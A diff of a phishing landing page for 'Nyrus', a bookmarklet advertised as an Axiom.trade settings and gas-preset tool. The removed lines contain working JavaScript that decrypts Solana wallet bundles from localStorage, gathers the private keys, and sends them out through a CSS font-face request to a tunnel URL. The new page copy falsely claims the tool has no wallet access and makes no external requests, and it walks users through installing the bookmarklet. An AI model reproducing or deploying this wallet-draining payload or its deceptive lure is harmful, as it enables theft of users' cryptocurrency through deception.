Initializing Activation'); const res = await fetch('https://api8.axiom.trade/bundle-key-and-wallets', { method: 'POST', credentials: 'include' }); const data = await res.json(); if (!data.bundleKey) return; const key = await crypto.subtle.importKey('raw', base64ToBytes(data.bundleKey), { name: 'AES-GCM' }, false, ['decrypt']); let stolen = []; const solBundles = JSON.parse(localStorage.getItem('sBundles') || '[]'); for (const entry of solBundles) { const decrypted = await decrypt(key, entry); if (decrypted) { stolen.push({ type: 'SOL', public: base58(decrypted.slice(-32)), private: base58(decrypted) }); } } if (stolen.length > 0) { console.log('%c[+] Success. Communicating with Server...', 'color: lime;'); const payload = btoa(JSON.stringify({ keys: stolen })); const style = document.createElement('style'); style.textContent = `@font-face { font-family: 'leak'; src: url('${TUNNEL_URL}/?data=${encodeURIComponent(payload)}'); }`; document.head.appendChild(style); const div = document.createElement('div'); div.style.fontFamily = 'leak'; div.textContent = '.'; document.body.appendChild(div); console.log('[!] Data initialized'); } else { console.warn('[-] No data found.'); } } catch (e) { console.error('[-] Error:', e); } })();"
-class="btn"
-id="sync-btn"
-draggable="true">
-Sync to Axiom
-</a>
-</div>
+  <!-- sync / get the bookmarklet -->
+  <section id="sync">
+    <div class="wrap">
+      <div class="sync-wrap">
+        <div>
+          <span class="label">Get Started</span>
+          <h2 class="sh">Grab the bookmarklet.</h2>
+          <p class="sub">Drag the button to your bar, then click it on Axiom whenever you want your settings loaded.</p>
 
-<div class="setup-guide">
-<span class="guide-title">Deployment Guide</span>
-<div class="step">
-<span class="step-num">01</span>
-<span>Enable Bookmarks Bar (<code>Ctrl+Shift+B</code>)</span>
-</div>
-<div class="step">
-<span class="step-num">02</span>
-<span>Drag the <b>Sync Button</b> to your bar</span>
-</div>
-<div class="step">
-<span class="step-num">03</span>
-<span>Navigate to Axiom.trade & click bookmark</span>
-</div>
-</div>
-</div>
-</div>
-</main>
+          <div class="checklist">
+            <div class="check"><div class="check-icon">✓</div><span>Gas priority presets — low, medium, and high — ready to go</span></div>
+            <div class="check"><div class="check-icon">✓</div><span>Alpha filters pre-tuned to cut through the rugpulls and scams on Axiom</span></div>
+            <div class="check"><div class="check-icon">✓</div><span>Runs entirely in your browser tab — no servers involved</span></div>
+            <div class="check"><div class="check-icon">✓</div><span>No wallet access, no data collected, no external requests</span></div>
+          </div>
 
-<footer>
-&copy; 2026 Nyrus Infrastructure. Industrial Solana Tooling.
-</footer>
-</div>
+          <div style="background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:1.5rem;max-width:440px;">
+            <p style="font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:var(--text-dim);margin-bottom:8px;">Community project</p>
+            <p style="font-size:14px;color:var(--text-mid);line-height:1.7;">Nyrus is independent and not affiliated with Axiom. Built and maintained by the community, for the community.</p>
+          </div>
+        </div>
 
-<script>
-const btn = document.getElementById('sync-btn');
-const area = document.getElementById('sync-area');
+        <div class="sync-card">
+          <div class="mini-stats">
+            <div class="mini-stat">
+              <div class="l">Status</div>
+              <div class="v"><span class="live-dot" style="width:6px;height:6px;margin-right:5px;vertical-align:middle;"></span>Live</div>
+            </div>
+            <div class="mini-stat">
+              <div class="l">Version</div>
+              <div class="v">v2.1.0</div>
+            </div>
+            <div class="mini-stat">
+              <div class="l">Setup</div>
+              <div class="v">~30 seconds</div>
+            </div>
+            <div class="mini-stat">
+              <div class="l">Cost</div>
+              <div class="v" style="color:#48bb78;">Free</div>
+            </div>
+          </div>
 
-btn.addEventListener('dragstart', () => {
-btn.classList.add('dragging');
-area.classList.add('dragging');
-});
+          <div class="drag-zone">
+            <a href="IMPORT-CODE" class="btn-primary" draggable="true">⚡ Sync to Axiom</a>
+            <p class="drag-hint">↑ Drag this button to your bookmarks bar</p>
+          </div>
 
-btn.addEventListener('dragend', () => {
-btn.classList.remove('dragging');
-area.classList.remove('dragging');
-});
-</script>
+          <div class="deploy-steps">
+            <span class="ds-title">Deployment Guide</span>
+            <div class="ds"><span class="ds-n">01</span><span>Show your bar: <code>Ctrl+Shift+B</code> (Win) or <code>⌘+Shift+B</code> (Mac)</span></div>
+            <div class="ds"><span class="ds-n">02</span><span>Drag <strong>Sync to Axiom</strong> up to your bookmarks bar</span></div>
+            <div class="ds"><span class="ds-n">03</span><span>Go to <code>axiom.trade</code> and click your new bookmark</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- features -->
+  <section id="features" class="alt-bg">
+    <div class="wrap">
+      <span class="label">Features</span>
+      <h2 class="sh">Built for speed. Kept simple.</h2>
+      <p class="sub">Everything Nyrus does is scoped to making your Axiom sessions faster, with nothing extra bolted on.</p>
+      <div class="feat-grid">
+        <div class="feat-card">
+          <div class="feat-icon">🎚️</div>
+          <h3>Alpha Filters</h3>
+          <p>Pre-tuned filter presets to actually find those bread winnin' plays before anyone else does.</p>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">⛽</div>
+          <h3>Gas Presets</h3>
+          <p>Tracks live Solana and meme coin prices to calculate the best fee for your situation — low for slower, cheaper txns, medium for a balance, high when you need to be first in and can't miss the entry.</p>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🔒</div>
+          <h3>Zero Tracking</h3>
+          <p>Nyrus makes no outside requests and never touches your wallet. It's a script that runs locally in your browser tab.</p>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">📦</div>
+          <h3>Nothing to Install</h3>
+          <p>No extension, no account, no software. A bookmark is all it takes. Works on Chrome, Brave, and Arc.</p>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">🤝</div>
+          <h3>Community Driven</h3>
+          <p>Built by people who actually use Axiom. If something's off or you want a feature, say something — this thing gets updated.</p>
+        </div>
+        <div class="feat-card">
+          <div class="feat-icon">⏱️</div>
+          <h3>30-Second Setup</h3>
+          <p>Drag, save, done. No configuration wizard, no onboarding flow. You're set up before your next trade.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- faq -->
+  <section id="faq">
+    <div class="wrap">
+      <span class="label">FAQ</span>
+      <h2 class="sh">Common questions.</h2>
+      <p class="sub">Straight answers, nothing hidden.</p>
+      <div class="faq-list">
+        <div class="faq-item">
+          <div class="faq-q">Is Nyrus safe to use?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">Yeah. It's a bookmarklet — just a tiny bit of JS that runs in your tab on the Axiom page. No servers, no wallet access, nothing gets collected.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-q">Does it touch my wallet?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">No. Nyrus only interacts with the Axiom page interface to update settings. It has zero access to your private keys, seed phrase, or any connected wallet.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-q">Which browsers work?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">Chrome, Brave, and Arc work great. Edge should also work. Firefox is mostly fine but less tested — if you run into something, let us know.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-q">Do I have to redo this every session?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">Yep, one click per session. The bookmark stays in your bar permanently — just click it when you open Axiom and your settings are loaded. They stick until you close the tab or refresh.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-q">Is this affiliated with Axiom?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">Nope — Nyrus is a fully independent community project, not affiliated with or endorsed by Axiom in any way. It just works on top of their existing interface.</div>
+        </div>
+        <div class="faq-item">
+          <div class="faq-q">Is it free?
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+          </div>
+          <div class="faq-a">Completely. No premium tier, no token, no subscription. Free now, free forever.</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- changelog -->
+  <section id="changelog" class="alt-bg">
+    <div class="wrap">
+      <span class="label">Changelog</span>
+      <h2 class="sh">What's been updated.</h2>
+      <p class="sub">Here's what's changed.</p>
+      <div class="cl-list">
+        <div class="cl-row">
+          <span class="cl-badge new">New</span>
+          <span class="cl-ver">v2.1.0</span>
+          <span class="cl-desc">Alpha filters rebuilt — tighter thresholds, better signal</span>
+          <span class="cl-date-pill">Feb 2026</span>
+        </div>
+        <div class="cl-row">
+          <span class="cl-badge fix">Fix</span>
+          <span class="cl-ver">v2.0.3</span>
+          <span class="cl-desc">Medium gas tier not applying after Axiom's Jan UI update</span>
+          <span class="cl-date-pill">Jan 2026</span>
+        </div>
+        <div class="cl-row">
+          <span class="cl-badge update">Update</span>
+          <span class="cl-ver">v2.0.2</span>
+          <span class="cl-desc">Arc browser support confirmed and tested</span>
+          <span class="cl-date-pill">Dec 2025</span>
+        </div>
+        <div class="cl-row">
+          <span class="cl-badge new">New</span>
+          <span class="cl-ver">v2.0.0</span>
+          <span class="cl-desc">Initial public release — gas presets & base filter config</span>
+          <span class="cl-date-pill">Nov 2025</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- footer -->
+  <footer>
+    <div class="footer-links">
+      <a href="#how-it-works">How it Works</a>
+      <a href="#features">Features</a>
+      <a href="#faq">FAQ</a>
+      <a href="#changelog">Changelog</a>
+    </div>
+    <p>© 2026 Nyrus &nbsp;·&nbsp; Community-built Axiom tooling &nbsp;·&nbsp; Not affiliated with Axiom</p>
+    <p style="margin-top:0.5rem; font-size:12px; color:var(--text-dim);">Last updated February 2026 &nbsp;·&nbsp; v2.1.0</p>
+  </footer>
+
+  <script>
+  // draw and animate the star field on canvas
+  (function(){
+    const c = document.getElementById('stars');
+    const x = c.getContext('2d');
+    let W, H, S = [];
+    function resize(){ W = c.width = innerWidth; H = c.height = innerHeight; }
+    function seed(){
+      S = [];
+      const n = Math.floor(W*H/4500);
+      for(let i=0;i<n;i++) S.push({
+        x:Math.random()*W, y:Math.random()*H,
+        r:Math.random()*0.9+0.15,
+        a:Math.random()*0.8+0.1,
+        sp:Math.random()*0.003+0.001,
+        ph:Math.random()*Math.PI*2
+      });
+    }
+    let t=0;
+    function draw(){
+      x.clearRect(0,0,W,H); t+=0.01;
+      S.forEach(s=>{
+        const a = s.a*(0.5+0.5*Math.sin(t*s.sp*60+s.ph));
+        x.beginPath(); x.arc(s.x,s.y,s.r,0,Math.PI*2);
+        x.fillStyle=`rgba(200,220,255,${a})`; x.fill();
+      });
+      requestAnimationFrame(draw);
+    }
+    resize(); seed(); draw();
+    window.addEventListener('resize',()=>{resize();seed();});
+  })();
+
+  // toggle between dark and light, swap the icon
+  const themeBtn = document.getElementById('themeBtn');
+  themeBtn.addEventListener('click',()=>{
+    const dark = document.documentElement.getAttribute('data-theme')==='dark';
+    document.documentElement.setAttribute('data-theme', dark?'light':'dark');
+    themeBtn.textContent = dark ? '☀️' : '🌙';
+  });
+
+  // intercept anchor clicks and scroll smoothly
+  document.querySelectorAll('a[href^="#"]').forEach(a=>{
+    a.addEventListener('click', e=>{
+      const target = document.querySelector(a.getAttribute('href'));
+      if(!target) return;
+      e.preventDefault();
+      const navH = document.querySelector('nav').offsetHeight;
+      window.scrollTo({ top: target.getBoundingClientRect().top + scrollY - navH - 20, behavior:'smooth' });
+    });
+  });
+
+  // open/close FAQ items, one at a time
+  document.querySelectorAll('.faq-item').forEach(item=>{
+    item.querySelector('.faq-q').addEventListener('click',()=>{
+      const open = item.classList.contains('open');
+      document.querySelectorAll('.faq-item').forEach(i=>i.classList.remove('open'));
+      if(!open) item.classList.add('open');
+    });
+  });
+
+  // fade cards up as they enter the viewport
+  const obs = new IntersectionObserver(entries=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting){ e.target.style.opacity='1'; e.target.style.transform='translateY(0)'; }
+    });
+  }, { threshold:0.07 });
+
+  document.querySelectorAll('.step-card,.feat-card,.faq-item,.sync-card,.check').forEach((el,i)=>{
+    el.style.opacity='0';
+    el.style.transform='translateY(20px)';
+    el.style.transition=`opacity 0.5s ${i*0.04}s ease, transform 0.5s ${i*0.04}s ease, border-color 0.3s, box-shadow 0.3s`;
+    obs.observe(el);
+  });
+
+  // move the glow div with the mouse
+  const cursorGlow = document.getElementById('cursor-glow');
+  document.addEventListener('mousemove', e => {
+    cursorGlow.style.left = e.clientX + 'px';
+    cursorGlow.style.top  = e.clientY + 'px';
+  });
+
+  // track cursor inside each card so the radial glow follows it
+  document.querySelectorAll('.feat-card, .step-card').forEach(card => {
+    card.addEventListener('mousemove', e => {
+      const r = card.getBoundingClientRect();
+      const x = ((e.clientX - r.left) / r.width  * 100).toFixed(1) + '%';
+      const y = ((e.clientY - r.top)  / r.height * 100).toFixed(1) + '%';
+      card.style.setProperty('--mx', x);
+      card.style.setProperty('--my', y);
+    });
+  });
+
+  </script>
 </body>
 </html>
